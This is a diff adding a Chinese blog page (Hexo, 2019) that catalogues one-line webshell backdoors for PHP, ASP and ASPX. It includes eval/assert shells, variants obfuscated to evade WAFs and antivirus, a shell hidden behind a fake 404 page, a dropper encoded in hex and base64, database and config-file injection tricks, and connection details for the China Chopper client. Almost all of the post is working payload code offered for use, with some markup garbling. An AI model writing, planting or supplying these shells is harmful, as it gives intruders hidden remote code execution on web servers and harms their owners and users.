@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    PHP一句话 |
+    
+    boy</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/technology.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-一句话木大全" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PHP一句话
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/08/02/一句话木大全/" class="article-date">
+  <time datetime="2019-08-01T16:00:00.000Z" itemprop="datePublished">2019-08-02</time>
+</a>
+        
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <p>PHP一句话：</p>
+<a id="more"></a>
+
+<pre><code>1、普通一句话
+
+    &lt;?php @eval($_POST[&apos;hihack&apos;]);?&gt;
+
+2、防爆破一句话
+
+    &lt;?php substr(md5($_REQUEST[&apos;x&apos;]),28)==&apos;6862&apos;&amp;&amp;eval($_REQUEST[&apos;hihack&apos;]);?&gt;    //菜刀地址http://192.168.64.137/x.php?x=myh0st  密码：hihack
+
+3、过狗一句话
+
+    &lt;?php ($_=@$_GET[s]).@$_($_POST[hihack])?&gt;  //菜刀地址 http://localhost/1.php?s=assert
+
+&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[hihack]);  ?&gt;
+
+4、404隐藏一句话
+
+    一句话代码如下：
+
+    &lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;  
+    &lt;html&gt;&lt;head&gt;  
+    &lt;title&gt;404 Not Found&lt;/title&gt;  
+    &lt;/head&gt;&lt;body&gt;  
+    &lt;h1&gt;Not Found&lt;/h1&gt;  
+    &lt;p&gt;The requested URL /error.php was not found on this server.&lt;/p&gt;  
+    &lt;/body&gt;&lt;/html&gt;  
+    &lt;?php  
+        @preg_replace(&quot;/[checksql]/e&quot;,$_POST[&apos;hihack&apos;],&quot;saft&quot;);  
+    ?&gt; 
+
+    菜刀连接：
+
+        在配置栏写上    &lt;O&gt;date=@eval($_POST[paxmac]);&lt;/O&gt; 
+
+5、不用　?  号的一句话
+
+    &lt;script language=&quot;php&quot;&gt;eval ($_POST[hihack]);&lt;/script&gt; 
+
+6、躲避检测
+
+    &lt;?php assert($_REQUEST[&quot;hihack&quot;]);?&gt; 
+
+7、变形一句话后门
+
+    &lt;?php fputs (fopen(pack(&quot;H*&quot;,&quot;6c6f7374776f6c662e706870&quot;),&quot;w&quot;),pack(&quot;H*&quot;,&quot;3c3f406576616c28245f504f53545b6c6f7374776f6c665d293f3e&quot;))?&gt;
+
+    &lt;?php @fputs(fopen(base64_decode(&apos;bXloMHN0LnBocA==&apos;),w),base64_decode(&apos;PD9waHAgQGV2YWwoJF9QT1NUWydoaWhhY2snXSk7Pz4=&apos;));?&gt;
+
+    访问该网页，然后菜刀连接：/myh0st.php  密码：hihack
+
+8、
+    &lt;?</code></pre><p>preg_replace(“/\s<em>[php](.+?)[/php]\s</em>/ies”, “\1”, $_GET[‘h’]);<br>?&gt;</p>
+<pre><code>    *.php?h=[php]${${@eval($_POST[pass])}}[/php]
+9、&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;hihack&quot;))%&gt;</code></pre><p>ASP一句话：<br>    10、<?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["hihack"]); ?><br>    1、普通一句话：</p>
+<pre><code>    &lt;%eval request(&quot;hihack&quot;)%&gt;        或         &lt;%execute(request(&quot;hihack&quot;))%&gt; 
+
+2、unicode编码的access木马 
+
+    向access数据库插入 ┼攠數畣整爠煥敵瑳∨≡┩&gt;   编码前：&lt;% execute request(&quot;a&quot;)%&gt;
+
+    然后备份出webshell，密码a
+
+3、配置文件插马（需要条件支持，插入的数据被写在了配置文件中）
+
+    插入：&quot;%&gt;&lt;% bbbb=request(&quot;aaaa&quot;)%&gt;&lt;%eval(bbbb)%&gt;&lt;%&apos;        访问爆错，获取到配置文件的地址，然后连接，密码aaaa
+
+4、不用%的一句话
+
+    &lt;script language=VBScript runat=server&gt;execute request(&quot;hihack&quot;)&lt;/script&gt;
+
+5、不用&quot;的一句话：
+
+    &lt;%eval request(chr(35))%&gt;        密码：#</code></pre><p>​    </p>
+<p>ASPX一句话：</p>
+<pre><code>1、普通一句话
+
+     &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;hihack&quot;],&quot;unsafe&quot;);%&gt;
+
+2、免杀一句话</code></pre><p>&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;&lt;%var PAY:String=Request[“\x61\x62\x63\x64”];eval(PAY,”\x75\x6E\x73\x61”+”\x66\x65”);%&gt; </p>
+<p>JSP一句话：（貌似没有用菜刀连的一句话！）</p>
+<pre><code>这个没怎么用过的，还请大牛补充！</code></pre><p>​    </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/08/02/一句话木大全/" data-id="cjzhovjrg0000t8sysf1k9hy9"
+         class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2019/08/09/hello-world/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Hello World
+          
+        </div>
+      </a>
+    
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/technology.js"></script>
+
+  </div>
+</body>
+</html>
